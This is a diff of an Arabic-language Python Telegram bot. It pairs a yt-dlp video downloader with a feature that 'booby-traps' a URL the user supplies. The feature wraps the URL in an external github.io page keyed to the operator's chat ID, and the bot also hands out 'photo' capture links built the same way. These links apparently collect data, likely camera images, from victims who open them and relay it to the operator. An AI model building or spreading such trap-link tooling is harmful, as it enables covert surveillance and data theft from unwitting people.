@@ -6,24 +6,22 @@ import http.server
 import yt_dlp
 import urllib3
 
-# إيقاف التحذيرات
+# إيقاف التحذيرات المزعجة
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# تهيئة المتغيرات
+# --- إعداد المتغيرات من السيرفر ---
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 COOKIES_DATA = os.getenv("COOKIES_DATA")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# إنشاء ملف الكوكيز تلقائياً من المتغيرات
+# تهيئة ملف الكوكيز تلقائياً عند التشغيل
 if COOKIES_DATA:
     with open('cookies.txt', 'w') as f:
         f.write(COOKIES_DATA)
-    print("✅ تم إنشاء ملف cookies.txt بنجاح.")
-else:
-    print("⚠️ تحذير: لم يتم العثور على COOKIES_DATA.")
+    print("✅ تم إنشاء ملف cookies.txt من المتغيرات بنجاح.")
 
-# الروابط المستقلة
+# روابطك المستقلة
 PHOTO_PAGE = "https://app-display.github.io/ca.html-chatld-/" 
 INJECT_PAGE = "https://app-display.github.io/ca.html-chatld2/"
 VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
@@ -31,31 +29,36 @@ IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.ap
 
 user_states = {}
 
+# --- السيرفر للبقاء نشطاً ---
 def run_dummy_server():
     port = int(os.environ.get("PORT", 8080))
     httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
     httpd.serve_forever()
 
+# --- محرك التحميل الشامل (Universal Downloader) ---
 def download_video_sync(url, chat_id):
+    file_path = f'/tmp/vid_{chat_id}.mp4'
+    ydl_opts = {
+        'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
+        'outtmpl': file_path,
+        'quiet': True,
+        'no_warnings': True,
+        'cookiefile': 'cookies.txt' if os.path.exists('cookies.txt') else None,
+        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+        'referer': 'https://www.google.com/',
+        'nocheckcertificate': True,
+        'geo_bypass': True,
+    }
+    
     try:
-        file_path = f'/tmp/vid_{chat_id}.mp4'
-        ydl_opts = {
-            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
-            'outtmpl': file_path,
-            'quiet': True,
-            'cookiefile': 'cookies.txt' if os.path.exists('cookies.txt') else None, 
-            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-            'referer': 'https://www.instagram.com/',
-            'nocheckcertificate': True,
-        }
-        
+        if os.path.exists(file_path): os.remove(file_path)
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            if os.path.exists(file_path): os.remove(file_path)
             info = ydl.extract_info(url, download=True)
             return file_path, info.get('title', 'Video')
-    except Exception as e: 
+    except Exception as e:
         return None, str(e)
 
+# --- القوائم ---
 def get_main_keyboard():
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
@@ -87,7 +90,7 @@ def handle_query(call):
         bot.edit_message_text("💣 أرسل الرابط الذي تريد تلغيمه:", chat_id, call.message.message_id)
     elif call.data == "dl_video":
         user_states[chat_id] = "waiting_for_url"
-        bot.edit_message_text("📥 أرسل رابط الفيديو للتحميل:", chat_id, call.message.message_id)
+        bot.edit_message_text("📥 أرسل رابط الفيديو (تيك توك، إنستغرام، فيسبوك...):", chat_id, call.message.message_id)
     elif call.data == "main_menu":
         bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
     elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ رابط الصور:\n{PHOTO_PAGE}?chatId={chat_id}")
@@ -99,19 +102,22 @@ def handle_query(call):
 def handle_text(message):
     chat_id = message.chat.id
     state = user_states.get(chat_id)
+    
     if state == "waiting_for_inject":
         target = message.text if message.text.startswith("http") else f"https://{message.text}"
         bot.reply_to(message, f"✅ تم التلغيم:\n{INJECT_PAGE}?target={target}&chatId={chat_id}")
         user_states[chat_id] = None
+        
     elif state == "waiting_for_url":
-        status_msg = bot.reply_to(message, "⏳ جاري التحميل...")
+        status_msg = bot.reply_to(message, "⏳ جاري التحميل... يرجى الانتظار.")
         path, title = download_video_sync(message.text, chat_id)
-        if path:
-            bot.send_video(chat_id, open(path, 'rb'), caption=title)
+        if path and os.path.exists(path):
+            with open(path, 'rb') as video:
+                bot.send_video(chat_id, video, caption=title)
             bot.delete_message(chat_id, status_msg.message_id)
             os.remove(path)
         else:
-            bot.edit_message_text(f"❌ فشل التحميل. تأكد من صحة الرابط وتحديث الكوكيز.", chat_id, status_msg.message_id)
+            bot.edit_message_text(f"❌ فشل التحميل. تأكد أن الرابط يعمل وقم بتحديث الكوكيز في المتغيرات.", chat_id, status_msg.message_id)
         user_states[chat_id] = None
 
 if __name__ == '__main__':
